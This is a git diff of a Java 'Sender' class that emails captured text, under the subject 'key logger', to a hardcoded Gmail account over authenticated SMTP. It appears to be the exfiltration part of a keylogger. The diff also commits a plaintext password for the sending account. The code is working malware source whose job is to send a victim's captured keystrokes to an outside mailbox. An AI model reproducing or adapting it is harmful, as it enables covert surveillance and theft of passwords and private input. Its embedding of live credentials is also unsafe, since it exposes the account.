@@ -12,19 +12,21 @@ import javax.mail.Transport;
 import javax.mail.internet.InternetAddress;
 import javax.mail.internet.MimeMessage;
 
-
+/**
+ * 
+ * @author NICK
+ *
+ */
 public class Sender {
 
 	private Sender() {};
 	
-	private static final String SENDER_GMAIL = "javaxmailtester@gmail.com";
-	private static final String SENDERS_PASSWORD = "";
-	
+	private static final String SENDER_MAIL = "javaxmailtester@gmail.com";
+	private static final String SENDERS_PASSWORD = "javaxmailtester12";
 	private static final String RECIEVERS_EMAIL = "javaxmailtester@gmail.com";
 	
 	private static Properties mailServerProperties;
-	private static Session mailSession;
-	private static MimeMessage mailMessage;
+
 	
 	public static void sendMail(String emailBody) throws Throwable {
 		
@@ -46,7 +48,7 @@ public class Sender {
 		
 		
 		//set the password authenticator object of javax.mail
-	     PasswordAuthentication pa = new PasswordAuthentication(SENDER_GMAIL,SENDERS_PASSWORD);
+	     PasswordAuthentication pa = new PasswordAuthentication(SENDER_MAIL,SENDERS_PASSWORD);
 	     try{
 	     Session session = Session.getDefaultInstance(mailServerProperties, 
 	                          new Authenticator(){
@@ -59,16 +61,15 @@ public class Sender {
 	     
 	     
 	     // -- Set the FROM and TO fields --
-	     msg.setFrom(new InternetAddress(SENDER_GMAIL)); // from whom the email is sent	
+	     msg.setFrom(new InternetAddress(SENDER_MAIL)); // from whom the email is sent	
 	     msg.setRecipients(Message.RecipientType.TO, 
 	                      InternetAddress.parse(RECIEVERS_EMAIL,false)); // to whom the email will be sent
 	     msg.setSubject("key logger"); //subject of email
-	    // msg.setText(emailBody); // text of the email
 	     msg.setContent(emailBody, "text/html");
 	     msg.setSentDate(new Date()); //date of the email
 	     Transport.send(msg);//send the email
 	     System.out.println("Message sent.");
-	  
+	     
 	     }catch (MessagingException e){ System.out.println("Error, message was not send correctly" + e);}
 	     
 	     
